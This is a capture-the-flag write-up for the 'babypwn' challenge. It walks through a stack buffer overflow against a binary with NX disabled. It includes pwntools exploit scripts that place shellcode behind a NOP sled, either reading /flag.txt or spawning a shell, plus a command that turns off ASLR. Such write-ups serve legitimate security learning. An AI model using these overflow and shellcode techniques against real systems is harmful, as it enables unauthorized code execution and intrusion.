# babypwn

Points: 100

```bash
➜ checksec babypwn
[*] '/home/squishy/Programs/ctf/2020/cyber_security_rumble/babypwn/baby-pwn-for-download/docker/babypwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

The only protection we have is that PIE enabled. Note that NX is disabled.
Also, we can see from the `babypwn_svc` that ASLR is disabled.

I started by trying to exploit it on the local executable:

To turn off ASLR:
```
➜ setarch `uname -m` -R $SHELL
```

This spawns a shell where any subsequent commands will have ASLR disabled as
well. Running a program in gdb disables ASLR by default.

By overflowing `user_md5`, I was eventually able to execute my shellcode payload
on the stack. I tested this and found that it worked by stepping through the
program in GDB.

However, when I actually ran the program (`./babypwn < payload`), I found that
it didn't work. This was because for some reason, the stack offset was
different from when I ran it in GDB. I was able to confirm this by inspecting
core files caused by the crash.

I then corrected the stack offset by using the address from the core file. This
allowed it to work when running the local executable. However, it failed when
running on my local containerized challenge as well as the remote challenge.

It seemed like:
- With ASLR disabled, the stack addresses will not be deliberately randomized
  between each run. This allowed my exploit to work locally with ASLR disabled.
- With PIE enabled, the stack address will change depending on the context.
  - When running in GDB, I got different stack addresses
  - When running locally, I got different stack addresses
  - When running from the containerized challenge, I got different stack addresses
  - But they are all consistent within themselves (i.e. they won't change each
    time you run it)

Since we don't know the stack addresses on the containerized challenge, we can
only guess. To increase the chances of a successful guess, we can precede our
shellcode with a generous amount of no-ops. Then we just try different stack
addresses until it works.

Script (also in `main_cat_clean.py`):
```python
import pwn

pwn.context.arch = 'amd64'

sh = pwn.remote('chal.cybersecurityrumble.de', 1990)


def inject_shellcode():
    # Target: 120 bytes
    # 8 bytes: (fake input)
    # 1 byte: (null to fool strlen)
    # 111 bytes: (padding)
    # ---
    # 8 bytes: address somewhere in no-ops to reach shellcode
    # ---
    # 2048 bytes: (no ops) <- Goal is to jump somewhere here
    # ? bytes: (shellcode)

    ret_addr_padding = 120

    payload = b'12345678' + b'\0';

    padding = ret_addr_padding - len(payload)
    payload += pwn.cyclic(padding)

    # Keep guessing values until this works.
    # You can use `➜ sudo dmesg | tail -10` to see info on where the program
    # failed.
    sh_code_addr = 0x7fffffffef90 # lucky guess

    print('sh_code_addr: ', hex(sh_code_addr))
    payload += pwn.p64(sh_code_addr)

    payload += pwn.asm(pwn.shellcraft.nop()) * 2048

    # Since we are using `gets`, `stdin` mustbe re-opened if we want to use it
    # Instead let's just `cat` the file
    sh_code = pwn.shellcraft.amd64.linux.cat('/flag.txt')
    sh_code += pwn.shellcraft.exit(0)

    sh_code = pwn.asm(sh_code)
    sh_code = pwn.encoder.line(sh_code)

    payload += sh_code
    print('Payload len: ', len(payload))

    return payload


payload = inject_shellcode()

with open('payload', 'wb') as f:
    f.write(payload)

sh.send(payload)
sh.interactive() # Hit enter to show the output of `cat /flag.txt`
```

---

Better solution from the author:

```python
from pwn import *

r = remote('localhost', 1990)
context(arch='amd64')

r.recvline()
pl = asm('sub rsp, 0x100;' + shellcraft.sh()).rjust(0x78, asm('nop'))
r.sendline(pl.hex() + p64(0x7fffffffe720).hex())
r.interactive()
```

He also said:

> better solution would be to make use of the provided docker (compile debug
> functionality of stack location into the binary and build container) or jump
> directly into the output function, as someone else noted.
